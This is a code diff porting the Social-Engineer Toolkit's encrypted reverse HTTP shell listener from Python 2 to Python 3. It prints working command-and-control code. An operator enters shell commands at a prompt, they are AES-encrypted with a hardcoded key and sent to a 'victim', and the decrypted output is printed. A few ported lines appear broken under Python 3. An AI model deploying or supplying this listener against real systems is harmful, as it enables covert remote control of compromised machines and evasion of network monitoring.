@@ -5,19 +5,20 @@
 # AES Encrypted Reverse HTTP Listener by:
 #
 #        Dave Kennedy (ReL1K)
-#     http://www.secmaniac.com
+#     https://www.trustedsec.com
 #
 #
 ############################################
-from BaseHTTPServer import BaseHTTPRequestHandler
-from BaseHTTPServer import HTTPServer
-import urlparse
+from http.server import BaseHTTPRequestHandler
+from http.server import HTTPServer
+import urllib
 import re
 import os
 import base64
 from Crypto.Cipher import AES
 import sys
 import time
+from src.core.setcore import *
 
 # the block size for the cipher object; must be 16, 24, or 32 for AES
 BLOCK_SIZE = 32
@@ -40,85 +41,91 @@ secret = "(3j^%sh@hd3hDH2u3h@*!~h~2&^lk<!L"
 cipher = AES.new(secret)
 
 # url decode for postbacks
+
+
 def htc(m):
-    return chr(int(m.group(1),16))
+    return chr(int(m.group(1), 16))
 
 # url decode
+
+
 def urldecode(url):
-    rex=re.compile('%([0-9a-hA-H][0-9a-hA-H])',re.M)
-    return rex.sub(htc,url)
+    rex = re.compile('%([0-9a-hA-H][0-9a-hA-H])', re.M)
+    return rex.sub(htc, url)
+
 
 class GetHandler(BaseHTTPRequestHandler):
 
-        # handle get request
-        def do_GET(self):
+    # handle get request
+    def do_GET(self):
 
-                # this will be our shell command
-                message = raw_input("shell> ")
-                # if we specify quit, then sys arg out of the shell
-                if message == "quit" or message == "exit":
-                        print ("\nExiting the SET RevShell Listener... ")
-                        time.sleep(2)
-                        sys.exit()
-                # send a 200 OK response
-                self.send_response(200)
-                # end headers
-                self.end_headers()
-                # encrypt the message
-                message = EncodeAES(cipher, message)
-                # base64 it
-                message = base64.b64encode(message)
-                # write our command shell param to victim
-                self.wfile.write(message)
-                # return out
-                return
+        # this will be our shell command
+        message = input("shell> ")
+        # if we specify quit, then sys arg out of the shell
+        if message == "quit" or message == "exit":
+            print ("\nExiting the SET RevShell Listener... ")
+            time.sleep(2)
+            sys.exit()
+        # send a 200 OK response
+        self.send_response(200)
+        # end headers
+        self.end_headers()
+        # encrypt the message
+        message = EncodeAES(cipher, message)
+        # base64 it
+        message = base64.b64encode(message)
+        # write our command shell param to victim
+        self.wfile.write(message)
+        # return out
+        return
 
-        # handle post request
-        def do_POST(self):
+    # handle post request
+    def do_POST(self):
 
-                # send a 200 OK response
-                self.send_response(200)
-                # # end headers
-                self.end_headers()
-                # grab the length of the POST data
-                length = int(self.headers.getheader('content-length'))
-                # read in the length of the POST data
-                qs = self.rfile.read(length)
-                # url decode
-                url=urldecode(qs)
-                # remove the parameter cmd
-                url=url.replace("cmd=", "")
-                # base64 decode
-                message = base64.b64decode(url)
-                # decrypt the string
-                message = DecodeAES(cipher, message)
-                # display the command back decrypted
-                print message
+        # send a 200 OK response
+        self.send_response(200)
+        # # end headers
+        self.end_headers()
+        # grab the length of the POST data
+        length = int(self.headers.getheader('content-length'))
+        # read in the length of the POST data
+        qs = self.rfile.read(length)
+        # url decode
+        url = urldecode(qs)
+        # remove the parameter cmd
+        url = url.replace("cmd=", "")
+        # base64 decode
+        message = base64.b64decode(url)
+        # decrypt the string
+        message = DecodeAES(cipher, message)
+        # display the command back decrypted
+        print(message)
 
-if __name__ == '__main__':
+# if __name__ == '__main__':
+try:
+    # bind to all interfaces
+    if check_options("PORT=") != 0:
+        port = check_options("PORT=")
 
-        # bind to all interfaces
-        if os.path.isfile("src/program_junk/port.options"):
-                fileopen = file("src/program_junk/port.options", "r")
-                port = fileopen.read().rstrip()
+    else:
+        port = 443
 
-        else:
-                port = 443
-
-        server = HTTPServer(('', int(port)), GetHandler)
-        print """############################################
+    server = HTTPServer(('', int(port)), GetHandler)
+    print("""############################################
 #
 # The Social-Engineer Toolkit (SET) HTTP RevShell
 #
 #        Dave Kennedy (ReL1K)
-#     http://www.secmaniac.com
+#     https://www.trustedsec.com
 #
-############################################"""
-        print 'Starting encrypted web shell server, use <Ctrl-C> to stop'
-        # simple try block
-        try:
-                # serve and listen forever
-                server.serve_forever()
-        # handle keyboard interrupts
-        except KeyboardInterrupt: 
-                print "[!] Exiting the encrypted webserver shell.. hack the gibson."
+############################################""")
+    print('Starting encrypted web shell server, use <Ctrl-C> to stop')
+    # simple try block
+    try:
+        # serve and listen forever
+        server.serve_forever()
+    # handle keyboard interrupts
+    except KeyboardInterrupt:
+        print("[!] Exiting the encrypted webserver shell.. hack the gibson.")
+except Exception as e:
+    print("Something went wrong, printing error: " + e)
